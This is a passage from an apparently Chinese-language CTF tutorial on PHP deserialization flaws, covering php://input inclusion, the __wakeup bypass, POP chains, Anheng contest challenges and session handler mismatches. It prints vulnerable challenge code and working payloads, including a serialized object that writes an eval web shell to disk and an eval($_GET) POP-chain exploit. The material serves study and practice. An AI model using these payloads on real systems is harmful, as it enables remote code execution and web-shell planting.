</code></pre><p>首先需要利用的是<code>file_get_contents()</code>来达到包含任意文件的目的，利用php伪协议<code>php://input</code>可以控制内容。<br>以前一直认为<code>php://input</code>只能接收POST请求提交的数据<br>但是测试的时候GET也可以获取到原始数据流，实际上</p><blockquote><p><code>php://input</code>可以读取http entity body中指定长度的值,由<code>Content-Length</code>指定长度,不管是<code>POST</code>方式或者<code>GET</code>方法提交过来的数据。但是，一般GET方法提交数据 时，http <code>request entity body</code>部分都为空。<br>php://input 与$HTTP_RAW_POST_DATA读取的数据是一样的，都只读取Content-Type不为multipart/form-data的数据。<br>也就是说明<code>GET</code>请求也可以在请求的body中传入原始数据流让<code>php://input</code>接收</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"txt"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the bugkuctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"hello friend!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"涓嶈兘鐜板湪灏辩粰浣爁lag鍝�"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"you are not the number of bugku ! "</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//flag.php</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">"good"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可控制 <code>$file</code>来达到文件读写，利用反序列化漏洞，因为序列化保存类的属性，所以可构造</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> flag<span class="token punctuation">.</span>php<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>即可控制读取的文件</p><p><code>__wakeup</code>漏洞</p><p>当php是低版本时存在漏洞，当输入的反序列化的对象个数大于真实的个数时，会使得<code>__wakeup</code>函数失效从而可以绕过,同时对象被销毁，执行<code>__destruct().</code>所以攻击者可以绕过<code>__wakeup</code>调用精心设计的<code>__destruct()</code>方法</p><p>利用</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">.</span><span class="token string">'\shell.php'</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"Waking up...\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>poc   <code>test = O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;}</code></p><p>构造pop链</p><pre class=" language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">lemon</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$classObj</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">classObj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">normal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 私有变量$classObj 复制为新类normal的对象，并且调用了该类的方法action</span>        <span class="token comment" spellcheck="true">// 但是有趣的是，另一个类evil 也有同名方法action</span>        <span class="token comment" spellcheck="true">// 所以可以构造pop 链，使得其在__destruct 方法中调用evil 类里的action 方法</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">classObj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">normal</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//poc</span><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">lemon</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$classObj</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$classObj</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">classObj</span> <span class="token operator">=</span> <span class="token variable">$classObj</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token string">'eval("$_GET[${s}]")'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">lemon</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>安恒 月赛题</p><pre class=" language-php"><code class="language-php">@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">baby</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"./{$this->file}"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//O:4:"baby":1:{s:4:"file";s:8:"flag.php";}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$good</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$good</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"./test.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>安恒 2019 一月月赛<br>当时没做出来，赛后也没总结，现在拿出来再分析一下</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">baby</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$skyobj</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$bbb</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">skyobj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">sec</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">skyobj</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">skyobj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">cool</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$amzing</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nice</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">amzing</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nice</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">aaa</span> <span class="token operator">=</span> <span class="token variable">$sth</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nice</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">aaa</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nice</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bbb</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"./{$this->filename}"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token string">"you must be joking!"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">sec</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"it's so sec~~"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$Input_data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$Input_data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"./test.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>首先明确利任意文件读取的利用点是 <code>__toString</code>方法，然后看到<code>__toString</code>方法下面有一个<code>read()</code>方法，很明显要利用<code>cool</code>里的<code>read()</code>方法来达到目的。明确目标就可以来构造<code>pop</code>链</p><p><code>cool</code>的<code>read()</code>方法需要反序列化一个类，这个类很明显是<code>baby</code>类，而且需要满足<code>$aaa=$bbb</code>，发现<code>$aaa</code>会被重新赋值，而且无法控制，这里可以用地址符来保证一定相等<br>构造<code>amzing</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">baby</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$skyobj</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">skyobj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">cool</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">baby</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bbb</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">aaa</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D</span></code></pre><p>然后可以构造完整exp</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">cool</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$amzing</span> <span class="token operator">=</span> <span class="token string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">baby</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span></code></pre><h2 id="php-session的反序列化漏洞"><a href="#php-session的反序列化漏洞" class="headerlink" title="php session的反序列化漏洞"></a>php session的反序列化漏洞</h2><p><code>php.ini</code> 中有几个与<code>session</code>存储有关的配置项</p><pre class=" language-php"><code class="language-php">session<span class="token punctuation">.</span>save_path<span class="token operator">=</span><span class="token string">""</span>  <span class="token comment" spellcheck="true">//设置session的储存路径</span>session<span class="token punctuation">.</span>auto_start   <span class="token comment" spellcheck="true">//指定会话模块是否在请求开始的时候自动创建会话，默认不开启，也可以在php中使用session_start()来开启</span>session<span class="token punctuation">.</span>serialize_handler  <span class="token comment" spellcheck="true">//定义用来序列化/反序列化的处理器名字</span>session<span class="token punctuation">.</span>save_handler   <span class="token comment" spellcheck="true">//指定保存的方式，默认是files</span></code></pre><p>根据<code>session.serialize_handler</code>的不同，保存的<code>session</code>也不同</p><pre class=" language-php"><code class="language-php"><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// key|s:4:"value"</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// a:1:{s:3:"key";s"5"value";}</span></code></pre><p>简单应用一下</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">/*session.php*/</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">/*put.php*/</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"D:\wamp64\www\shell.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>首先发现这两个页面解析的方法不一样，导致了基于<code>session</code>的php反序列化漏洞<br>访问<code>session.php?test=|O%3A4%3A%22test%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22%3C%3Fphp+phpinfo%28%29%3B%22%3B%7D</code><br>后面那一串是</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"&lt;?php 